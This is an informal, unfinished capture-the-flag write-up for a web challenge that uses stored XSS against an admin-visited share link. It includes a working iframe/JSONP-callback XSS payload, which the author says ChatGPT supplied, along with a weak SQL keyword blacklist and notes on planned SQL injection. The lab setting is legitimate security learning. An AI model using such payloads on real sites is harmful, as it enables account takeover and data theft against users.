Was given a zip file, inside the zip we had a docker file and src and readme file.looking at the readme file we had to exfiltrate the flag when admin visits a link, it was a stored xss. so i ran docker 
i visited the site went to script.js and was looking for anything i can give an input to and found it 
```
libraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title) 
    .replace("Book Author", book.author);
```
i had to give input in the title of the website and create a link of that book and share the link to the admin  to infiltrate the flag, i tried many payloads none of them worked , Then chatgpt gave me a payload
```
<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:9780980200447&jscmd=viewapi&callback=alert(1)'></script>"></iframe>
```

<img width="1336" height="863" alt="Screenshot_20251210_115633" src="https://github.com/user-attachments/assets/a1d7999a-11c4-416a-9019-7400e233a87f" />

this worked i got a popup so xxs is successfull know i had to create a share link which i couldnt so i opened another book sharedlink and pasted liteid of the xss book in it
```
Tt-F93Pp-k
http://localhost:50001/liteShare/admin1/Tt-F93Pp-k
```


and then i logind from the admin and opened the shared link and yes i got the popup but now i had to infiltrate the flag 
<img width="1915" height="994" alt="Screenshot_20251210_120136" src="https://github.com/user-attachments/assets/8628f1e3-5b6e-4714-bc68-3b4ce1e4cca9" />

but i had no clue how to do it , i looked into the utils.js and found 
```
const BLACKLIST = ["delete", "update", "drop", "insert", "view", "sleep"];
const isSqlSafe = (input) => {
    let isSafe = true;
    BLACKLIST.forEach((word) =>
        input.toLowerCase().includes(word) ? (isSafe = false) : {}
    );
    return isSafe;
};
```
and a lot of sql code in utilsdb.js 
```
const checkUserPassword = (username, plainPassword) =>
    new Promise((resolve, reject) => {
        const db_users = new sqlite3.Database(
            `${process.env.DB_FOLDER}/users.db`
        );
        db_users.serialize(() =>
            db_users.all(
                "SELECT * FROM USERS WHERE username = ?",
                username,
                async (err, rows) => {
                    if (!rows || rows.length === 0) {
                        db_users.close();
                        return resolve(false);
                    }
                    const user = rows[0];
                    const bcrypt = require("bcrypt");
                    const match = await bcrypt.compare(plainPassword, user.hash);
                    db_users.close();
                    return match ? resolve(user) : resolve(false);
                }
            )
        );
    });

```
so i had to do a sql injection ig with the xss payload i am trying that, reading stuff about it will give some stuff a try 

